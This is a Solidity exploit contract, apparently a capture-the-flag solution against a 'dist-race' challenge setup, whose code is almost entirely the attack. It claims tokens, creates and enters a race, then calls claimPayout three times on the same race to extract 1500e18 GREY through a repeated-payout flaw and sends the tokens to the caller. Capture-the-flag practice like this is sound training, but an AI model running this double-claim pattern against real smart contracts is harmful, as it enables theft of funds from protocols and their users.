// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Setup} from "./dist-race/Setup.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve_part_1() external {
        // Claim 500e18 GREY
        setup.claim();
        // Exploit: 500e18 GREY

        // Create a GREY with 400e18 GREY payout, 100e18 GREY entry price, and 1 minute duration
        setup.grey().approve(address(setup.race()), 400e18);
        setup.race().createRace(400e18, 1 minutes, 100e18);
        // Exploit: 100e18 GREY

        // Enter the race
        setup.grey().approve(address(setup.race()), 100e18);
        setup.race().enterRace(2);
        // Exploit: 100e18 GREY
    }

    // Advance time by 1 minutes
    // vm.warp(block.timestamp + 1 minutes);

    function solve_part_2() external {
        // Claim the payout
        setup.race().claimPayout(2);
        // Exploit: 500e18 GREY

        // Claim the payout again
        setup.race().claimPayout(2);
        // Exploit: 1000e18 GREY

        // Claim the payout again
        setup.race().claimPayout(2);
        // Exploit: 1500e18 GREY

        // Transfer 1500e18 GREY to msg.sender
        setup.grey().transfer(msg.sender, 1500e18);
    }
}
